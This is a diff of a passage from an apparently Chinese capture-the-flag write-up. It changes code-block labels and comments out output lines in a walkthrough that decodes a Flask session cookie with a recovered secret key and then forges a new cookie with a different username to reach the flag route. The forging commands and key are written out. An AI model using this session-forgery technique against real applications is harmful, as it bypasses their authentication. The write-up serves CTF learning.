@@ -464,16 +464,20 @@ print(randStr)
 ```
 (注意这里还只有用python2跑脚本，不知道为什么，python3跑精度不一样)没有环境可以用在线网站跑
 https://www.jyshare.com/compile/6/
-```bash
+```powershell
 PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  decode -c 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aUWTbQ.0TPXGKzeVGnMLGVPXIYTyxqUHcs' -s '74.8534422833'
-{'username': b'www-data'}
+
+# {'username': b'www-data'}
+
 PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  decode -c 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aUWTbQ.0TPXGKzeVGnMLGVPXIYTyxqUHcs' -s '74.8534422833095'
-[Decoding error] Signature b'0TPXGKzeVGnMLGVPXIYTyxqUHcs' does not match
+
+# [Decoding error] Signature b'0TPXGKzeVGnMLGVPXIYTyxqUHcs' does not match
 ```
 我们这里需要`username=fuck`，用工具改一下：
-```bash
+```powershell
 PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  encode -s '74.8534422833' -t "{'username': b'fuck'}"
-eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.aUWhdQ.taV6yt4OcPpldzPixEfVI_XnvbA
+
+# eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.aUWhdQ.taV6yt4OcPpldzPixEfVI_XnvbA
 ```
 然后访问flag路由就好了，注意这里，我们伪造是只需要key的，因为后面的签名和前面有关
 ![500](assets/Day%203/file-20251220030430083.png)
